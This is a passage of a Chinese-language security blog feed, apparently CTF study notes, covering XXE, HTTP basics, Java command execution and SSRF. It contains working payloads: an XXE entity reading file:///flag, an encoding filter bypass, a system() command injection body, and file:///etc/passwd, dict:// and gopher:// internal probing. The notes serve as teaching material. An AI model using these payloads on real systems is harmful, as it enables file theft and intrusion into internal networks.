class="hljs-string">&quot;test101&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">core</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">xmlns:xi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xi:include</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://publicServer.com/file.xml&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xi:include</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><p><code>cat 1.xml | iconv -f UTF-8 -t UTF-16BE &gt; 16.xml</code>编码绕过</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight python"><figcaption><span>file:app.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/parse&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>():<br>    xml=request.form.get(<span class="hljs-string">&#x27;xml&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(xml)<br>    <span class="hljs-keyword">if</span> xml <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;None&quot;</span><br>    parser = etree.XMLParser(load_dtd=<span class="hljs-literal">True</span>, resolve_entities=<span class="hljs-literal">True</span>)<br>    root = etree.fromstring(xml, parser)<br>    name=root.find(<span class="hljs-string">&#x27;name&#x27;</span>).text<br>    <span class="hljs-keyword">return</span> name <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>先写一个html进行交互</p><figure class="highlight html"><figcaption><span>file:localhost.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XML 解析器<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XML 解析器<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://47.76.151.192:60088/parse&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;xml&quot;</span>&gt;</span>输入 XML 数据：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">required</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/Redis/"/>
    <url>/2025/03/22/Redis/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/HTTP/"/>
    <url>/2025/03/22/HTTP/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>HTTPS&#x3D;HTTP+SSL<br>HTTP端口80，HTTPS端口443</p><h3 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h3><p>当你传入 <code>?basectf=we1c%00me</code> 但实际变成了 <code>we1cme</code>，这是因为 <code>%00</code> 是 URL 编码中代表空字节（<code>NULL</code> 字符）的转义序列。许多 Web 服务器和编程语言在处理 URL 时会将 <code>%00</code> 识别为字符串结束符，从而忽略 <code>%00</code> 后面的内容。这在 Web 安全中称为“空字节截断”，通常用于绕过某些安全检查。</p><p>解决方法：</p><p><strong>双重编码</strong>：</p><ul><li>使用双重编码将 <code>%00</code> 编码成 <code>%2500</code>，使服务器不会直接识别它为空字节，但在服务器端你需要解码两次才能得到原始值。</li></ul><h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h3><ul><li>200 OK &#x2F;&#x2F;客户端请求成功</li><li>400 Bad Request &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解 </li><li>401 Unauthorized &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 </li><li>403 Forbidden &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务 </li><li>404 Not Found &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL </li><li>500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误 </li><li>503 Server Unavailable &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</li></ul><h3 id="请求头总结"><a href="#请求头总结" class="headerlink" title="请求头总结"></a>请求头总结</h3><p>http date标头使用案例:  Tue, 20 Aug 2024 00:00:00 GMT</p><ul><li>X-Forwarded-For：包含客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用逗号分隔。</li><li>X-Real-IP：包含客户端 IP 地址，与 X-Forwarded-For 的区别在于它只包含一个 IP 地址，而不是包含一系列 IP 地址列表。</li><li>Remote-Addr：包含客户端 IP 地址，但可能被代理服务器篡改。</li><li>Client-IP：包含客户端 IP 地址，但可能被代理服务器篡改。</li><li>Via：包含了 HTTP 请求经过的代理服务器的地址和版本信息，多个代理服务器之间用逗号分隔。</li><li>Forwarded：RFC 7239 规定的标准头部，包含了客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用分号分隔。</li><li>Forwarded-For：与 X-Forwarded-For 类似，用于标识客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用逗号分隔。</li><li>X-Originating-IP：用于标识客户端 IP 地址，但可能被代理服务器篡改。</li><li>X-Cluster-Client-IP：用于标识客户端 IP 地址，但可能被代理服务器篡改。</li><li>True-Client-IP：用于标识客户端 IP 地址，但可能被代理服务器篡改</li></ul><h3 id="发包GET改POST"><a href="#发包GET改POST" class="headerlink" title="发包GET改POST"></a>发包GET改POST</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">一、开头改请求方式<br>POST /?id=1 HTTP/1.1<br>把GET改成POST，GET和POST混合请求的统一用POST<br><br>二、中间添加一行参数<br>Content-Type: application/x-www-form-urlencoded<br>实际应用中，不写这句话会导致POST请求无效。<br><br>三、末尾空一行写POST参数<br>cmd=system(&#x27;cat /flllllaaaaaaggggggg&#x27;)<br></code></pre></td></tr></table></figure><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>状态码</td><td>状态码英文名称</td><td>中文描述</td></tr><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td></td><td></td><td></td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td></td><td></td><td></td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理。所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td></td><td></td><td></td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留，将来使用</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed</td><td>服务器无法满足Expect的请求头信息</td></tr><tr><td></td><td></td><td></td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取&#x2F;查询资源信息，而POST一般用于更新资源信息.</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>序号</td><td>方法</td><td>描述</td></tr><tr><td>1</td><td>GET</td><td>请求指定的页面信息，并返回实体主体。</td></tr><tr><td>2</td><td>HEAD</td><td>类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td>3</td><td>POST</td><td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td></tr><tr><td>4</td><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td>5</td><td>DELETE</td><td>请求服务器删除指定的页面。</td></tr><tr><td>6</td><td>CONNECT</td><td>HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td>7</td><td>OPTIONS</td><td>允许客户端查看服务器的性能。</td></tr><tr><td>8</td><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td>9</td><td>PATCH</td><td>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table><h3 id="HTTP响应头"><a href="#HTTP响应头" class="headerlink" title="HTTP响应头"></a>HTTP响应头</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>应答头</td><td>说明</td></tr><tr><td>Allow</td><td>服务器支持哪些请求方法（如GET、POST等）。</td></tr><tr><td>Content-Encoding</td><td>文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</td></tr><tr><td>Content-Length</td><td>表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</td></tr><tr><td>Content-Type</td><td>表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</td></tr><tr><td>Date</td><td>当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</td></tr><tr><td>Expires</td><td>应该在什么时候认为文档已经过期，从而不再缓存它？</td></tr><tr><td>Last-Modified</td><td>文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</td></tr><tr><td>Location</td><td>表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</td></tr><tr><td>Refresh</td><td>表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL&#x3D;<a href="http://host/path%22)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82">http://host/path&quot;)让浏览器读取指定的页面。</a>  <br>注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV&#x3D;”Refresh” CONTENT&#x3D;”5;URL&#x3D;<a href="http://host/path%22%EF%BC%9E%E5%AE%9E%E7%8E%B0%EF%BC%8C%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BA%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%88%B7%E6%96%B0%E6%88%96%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8CGI%E6%88%96Servlet%E7%9A%84HTML%E7%BC%96%E5%86%99%E8%80%85%E5%8D%81%E5%88%86%E9%87%8D%E8%A6%81%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E5%AF%B9%E4%BA%8EServlet%E6%9D%A5%E8%AF%B4%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AERefresh%E5%A4%B4%E6%9B%B4%E5%8A%A0%E6%96%B9%E4%BE%BF%E3%80%82">http://host/path&quot;＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。</a>  <br>  <br>注意Refresh的意义是”N秒之后刷新本页面或访问指定页面”，而不是”每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV&#x3D;”Refresh” …＞。  <br>  <br>注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</td></tr><tr><td>Server</td><td>服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</td></tr><tr><td>Set-Cookie</td><td>设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</td></tr><tr><td>WWW-Authenticate</td><td>客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm&#x3D;＼”executives＼””)。  <br>注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</td></tr></tbody></table><h2 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/JAVA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/03/22/JAVA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<figure class="highlight java"><figcaption><span>file:RCE.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeTest</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String args [])</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span> (args.length==<span class="hljs-number">0</span>) &#123;<br>            System.exit(<span class="hljs-number">1</span>);  <span class="hljs-comment">//没有参数就退出</span><br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> run. exec(command);  <span class="hljs-comment">//执行命令</span><br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream());<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(in);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> buff.readLine();temp!=<span class="hljs-literal">null</span>;temp=buff.readLine())&#123;<br>            System.out.println(temp);  <span class="hljs-comment">//输出结果</span><br>        &#125;<br>        buff .close();<br>        in.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -encoding UTF-8 RuntimeTest.java<br>java RuntimeTest <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/SSRF/"/>
    <url>/2025/03/22/SSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p>在 <a href="http://xxx.github.io@localhost/">http://xxx.github.io@localhost</a> 这种URL中，@符号前的部分（<code>xxx.github.io</code>）是用来提供用户信息的（通常是用户名和密码），实际请求会发送到@符号后面的部分（即<code>localhost</code>）。这是因为根据URL的标准格式，@符号前的内容被解释为“用户信息”，而不是实际的主机名。</p><p>这种方式可以被利用来绕过一些基于主机名的安全检查。比如，如果某个系统检查URL中是否包含某个域名，如github.io，并认为只要包含这个域名就是安全的，但没有进一步解析和验证@符号之后的部分，这样的系统就可能被绕过。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。<br>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file://从文件系统中获取文件内容，如 file:///etc/passwd<br>dict://字典服务协议，访问字典资源，如 dict:///ip:6739/info:<br>ftp://可用于网络端口扫描<br>sftp://SSH文件传输协议或安全文件传输协议<br>ldap://轻量级目录访问协议<br>tftp://简单文件传输协议<br>gopher://分布式文档传递服务<br></code></pre></td></tr></table></figure><h5 id="file"><a href="#file" class="headerlink" title="file"></a>file</h5><p>查找内网存活主机IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file://filepath            从文件系统中获取文件内容<br>file:///etc/passwd         读取文件passwd<br>file:///etc/hosts          显示当前操作系统网卡的IP<br>file:///proc/net/arp       显示arp缓存表（寻找内网其他主机）<br>file:///proc/net/fib_trie  显示当前网段路由信息<br></code></pre></td></tr></table></figure><h5 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h5><p>字典服务协议，访问字典资源<br>查找内网主机开放端口<br>可用于:扫描端口、获取内网信息、爆破密码等<br><code>dict://172.251.250.1:6397/info</code></p><h5 id="http"><a href="#http" class="headerlink" title="http"></a>http</h5><p>目录扫描</p><h5 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h5><p>第一位字符作为填充位（也就是说不转发第一个字符）<br>基本格式：<code>url:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code><br>默认端口是70</p><p><code>gopher://172.250.250.4:80/_</code></p><figure class="highlight 